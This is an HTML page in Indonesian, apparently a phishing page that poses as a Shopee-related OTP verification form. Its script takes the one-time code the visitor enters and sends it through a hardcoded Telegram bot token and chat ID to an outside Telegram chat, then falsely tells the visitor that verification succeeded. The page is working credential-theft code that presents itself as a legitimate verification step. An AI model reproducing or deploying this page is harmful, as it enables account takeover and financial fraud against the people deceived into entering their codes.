<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Verifikasi Kode OTP</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 2em; background: #f4f4f4;}
        .otp-form { max-width: 350px; margin: 2em auto; background: #fff; border-radius: 8px; box-shadow: 0 2px 8px #0001; padding: 32px 24px; }
        .telegram-contact { margin-top: 2em; text-align: center; }
        .telegram-btn {
            background: #229ED9;
            color: #fff;
            padding: 10px 22px;
            border-radius: 5px;
            text-decoration: none;
            font-weight: bold;
            display: inline-block;
            margin-top: 8px;
        }
        .telegram-btn:hover { background: #177CA6; }
        label, input { display: block; width: 100%; margin-bottom: 12px;}
        button { width: 100%; padding: 10px 0; background: #27c28c; color: #fff; border: none; border-radius: 5px; font-size: 1.1em; font-weight: bold; }
        button:hover { background: #1e9a70; }
    </style>
</head>
<body>
    <div class="otp-form">
        <h2>Masukkan Kode OTP</h2>
        <form id="otpForm">
            <label for="otp">Kode OTP (dikirim ke email Anda):</label>
            <input type="text" id="otp" maxlength="6" required placeholder="Masukkan kode OTP">
            <button type="submit">Verifikasi</button>
        </form>
    </div>
    <div class="telegram-contact">
        <p>Butuh bantuan? Hubungi bot Telegram kami:</p>
        <a class="telegram-btn" href="https://t.me/Shopee_MitraMinyakGorengBot" target="_blank">
            @Shopee_MitraMinyakGorengBot
        </a>
        <p style="font-size:0.9em;color:#888">Chat ID: 5923031825</p>
    </div>
    <script>
    document.getElementById('otpForm').addEventListener('submit', function(event) {
        event.preventDefault();
        var otp = document.getElementById('otp').value.trim();
        if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
            alert("Kode OTP harus 6 digit angka");
            return;
        }
        var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
        var chat_id = "5923031825";
        var text = "Verifikasi OTP: " + otp;
        var url = "https://api.telegram.org/bot" + token + "/sendMessage";
        var params = {
            chat_id: chat_id,
            text: text
        };
        fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(params)
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert('OTP berhasil diverifikasi!');
                window.location.href = 'index.html'; // arahkan sesuai kebutuhan
            } else {
                alert('Gagal mengirim ke Telegram: ' + data.description);
            }
        })
        .catch((error) => {
            alert("Gagal koneksi ke Telegram: " + error);
        });
    });
    </script>
</body>
</html>
